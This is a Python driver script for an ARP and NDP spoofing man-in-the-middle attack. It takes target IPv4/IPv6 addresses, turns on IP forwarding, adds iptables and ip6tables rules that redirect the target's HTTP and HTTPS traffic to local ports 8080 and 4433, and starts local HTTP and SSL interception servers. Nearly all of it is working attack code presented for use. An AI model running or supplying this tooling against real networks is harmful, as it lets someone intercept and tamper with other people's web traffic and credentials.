import arpspoof as spoof
import ndpspoof
import ssl_server
import http_server
import netifaces as ni
import time
import argparse
import subprocess
from multiprocessing import Process


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("interface", type=str,
                        help="network interface")
    parser.add_argument("-t", type=str,
                        help="target ip", nargs='?', default=None)
    parser.add_argument("-t6", type=str,
                        help="target ipv6", nargs='?', default=None)
    args = parser.parse_args()

    if args.t is None and args.t6 is None:
        print("you have to specify at least a target ipv4 or ipv6 (-t or -t6)")
        exit(-1)

    try:
        if args.t is not None:
            subprocess.run('echo "1" > /proc/sys/net/ipv4/ip_forward', shell=True)
            subprocess.run('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 4433', shell=True)
            subprocess.run('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080',
                           shell=True)
            spoof.arpspoof(args.t, args.interface)
        if args.t6 is not None:
            subprocess.run('sysctl -w net.ipv6.conf.all.forwarding=1', shell=True)
            subprocess.run('ip6tables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 4433',
                           shell=True)
            subprocess.run('ip6tables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080',
                           shell=True)
            ndpspoof.ndpspoof(args.t6, args.interface)

        host_ip = ni.ifaddresses(args.interface)[2][0]['addr']

        Process(target=http_server.start_server, args=([host_ip])).start()
        Process(target=ssl_server.start_server, args=[(host_ip)]).start()

        while 1:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] User interrupt")
        spoof.stop = 0
        ndpspoof.stop = 0
        ssl_server.stop = 0
        http_server.stop = 0